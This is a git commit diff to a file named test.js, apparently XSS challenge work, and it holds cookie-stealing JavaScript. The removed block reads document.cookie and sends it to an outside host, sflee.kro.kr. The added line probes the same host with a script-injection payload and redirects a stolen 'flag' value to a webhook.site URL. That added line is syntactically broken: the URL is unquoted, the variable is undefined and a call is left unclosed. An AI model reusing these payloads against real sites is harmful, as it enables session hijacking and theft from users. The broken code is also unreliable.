6816f4f516a1286112e0d09d6d6e246c34d0a85a
seohee0605 <165352981+seohee0605@users.noreply.github.com>
2024-09-19 01:48:55 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,14 +1,3 @@
-(function() {
-    const cookies = encodeURIComponent(document.cookie);
-    const Url = `http://sflee.kro.kr:5555/api/v1/my_cookie_info?cookies=${cookies}`;
-
-    fetch(Url, {
-        method: 'GET',
-        headers: {
-            'Content-Type': 'application/json'
-        }
-    })
-    .then(response => response.json())
-    .then(result => console.log('전송 완료:', result))
-    .catch(error => console.error('전송 실패:', error));
-})();
+fetch(http://sflee.kro.kr:5555/<script>alert(1)</script>).then((response) => response.json()).then(data => {var cookie = data.cookies[0].flag;
+location.href="https://webhook.site/dde0021c-614f-4dc0-b6fc-25294beae606" + flag
+}
